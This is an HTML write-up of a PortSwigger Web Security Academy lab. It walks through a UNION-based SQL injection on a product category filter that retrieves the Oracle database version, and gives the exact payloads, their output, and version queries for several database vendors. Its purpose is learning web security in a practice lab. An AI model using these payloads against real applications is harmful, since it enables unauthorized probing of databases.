@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SQL Injection - Examining the Database</title>
+<style>
+body{font-family:Arial,sans-serif;line-height:1.6;max-width:900px;margin:40px auto;padding:0 20px;color:#222;background:#f5f7fa}
+.container{background:#fff;padding:30px;border-radius:10px}
+h1,h2{color:#1f2937} h1{border-bottom:3px solid #333;padding-bottom:10px}
+pre{background:#111827;color:#f8fafc;padding:15px;border-radius:7px;overflow-x:auto}
+code{font-family:Consolas,monospace}.note,.success{padding:12px 16px;margin:18px 0}
+.note{background:#eff6ff;border-left:4px solid #2563eb}.success{background:#ecfdf5;border-left:4px solid #059669}
+table{width:100%;border-collapse:collapse;margin:15px 0}th,td{border:1px solid #ddd;padding:10px;text-align:left}th{background:#f3f4f6}
+</style>
+</head>
+<body><div class="container">
+
+<h1>SQL Injection: Examining the Database</h1>
+
+<p>
+This PortSwigger Web Security Academy lab contained a SQL injection vulnerability
+in the <strong>product category filter</strong>. The objective was to use a
+<strong>UNION attack</strong> to retrieve and display the database version.
+</p>
+
+<h2>1. Understanding the Objective</h2>
+<p>When exploiting SQL injection, it is often necessary to learn about the database behind the application. Useful information includes:</p>
+<ul><li>The type and version of the database software.</li><li>The tables contained in the database.</li><li>The columns contained in those tables.</li></ul>
+<p>
+In this lab, the hint indicated that the database was Oracle. Oracle also requires
+a table in a <code>SELECT</code> statement, so the built-in <code>dual</code>
+table was used for the initial UNION test.
+</p>
+
+<h2>2. Confirming the Number of Columns</h2>
+<p>The first step was to determine how many columns the original query returned and whether those columns could contain text.</p>
+<pre>'+UNION+SELECT+'abc','def'+FROM+dual--</pre>
+<p>This is logically equivalent to:</p>
+<pre>' UNION SELECT 'abc','def' FROM dual--</pre>
+<p>The application returned:</p>
+<pre>&lt;th&gt;abc&lt;/th&gt;
+&lt;td&gt;def&lt;/td&gt;</pre>
+<div class="success"><strong>Result:</strong> The UNION attack worked. This confirmed that the original query returned <strong>two columns</strong>, and both columns were compatible with text data.</div>
+
+<h2>3. Retrieving the Oracle Version</h2>
+<p>
+Oracle provides version information through the <code>v$version</code> view,
+with the version text available in the <code>BANNER</code> column.
+</p>
+<pre>'+UNION+SELECT+BANNER,+NULL+FROM+v$version--</pre>
+<p>This is logically equivalent to:</p>
+<pre>' UNION SELECT BANNER, NULL FROM v$version--</pre>
+<p>
+<code>BANNER</code> was placed in the first column because that is where the database
+information should appear. <code>NULL</code> was used for the second column to
+satisfy the two-column requirement discovered during testing.
+</p>
+
+<h2>4. Result</h2>
+<pre>CORE  11.2.0.2.0  Production
+NLSRTL Version 11.2.0.2.0 - Production
+Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
+PL/SQL Release 11.2.0.2.0 - Production
+TNS for Linux: Version 11.2.0.2.0 - Production</pre>
+<p>The important result was:</p>
+<pre>Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production</pre>
+<div class="success"><strong>Lab solved:</strong> The Oracle database version was successfully retrieved using a UNION-based SQL injection.</div>
+
+<h2>5. Querying Database Type and Version</h2>
+<p>
+The database type and version can potentially be identified by trying
+provider-specific queries and observing which one works.
+</p>
+<table>
+<tr><th>Database type</th><th>Version query</th></tr>
+<tr><td>Microsoft / MySQL</td><td><code>SELECT @@version</code></td></tr>
+<tr><td>Oracle</td><td><code>SELECT * FROM v$version</code></td></tr>
+<tr><td>PostgreSQL</td><td><code>SELECT version()</code></td></tr>
+</table>
+<p>For example:</p>
+<pre>' UNION SELECT @@version--</pre>
+<p>A response such as the following identifies Microsoft SQL Server and its version:</p>
+<pre>Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
+Mar 18 2018 09:11:49
+Copyright (c) Microsoft Corporation
+Standard Edition (64-bit) on Windows Server 2016 Standard 10.0</pre>
+
+<h2>6. What I Learned</h2>
+<ul>
+<li>SQL injection can be used to investigate the underlying database.</li>
+<li>A UNION attack requires the correct number of columns.</li>
+<li>The returned columns must have compatible data types.</li>
+<li>Oracle uses <code>dual</code> when a SELECT statement needs a FROM source.</li>
+<li>Oracle exposes version information through <code>v$version</code>.</li>
+<li>Database-specific syntax matters when testing SQL injection.</li>
+</ul>
+
+<div class="note">
+<strong>Core lesson:</strong> The process was:
+<strong>identify the injection point → determine the column count → confirm compatible data →
+identify the database → query the appropriate version information.</strong>
+</div>
+
+</div></body></html>
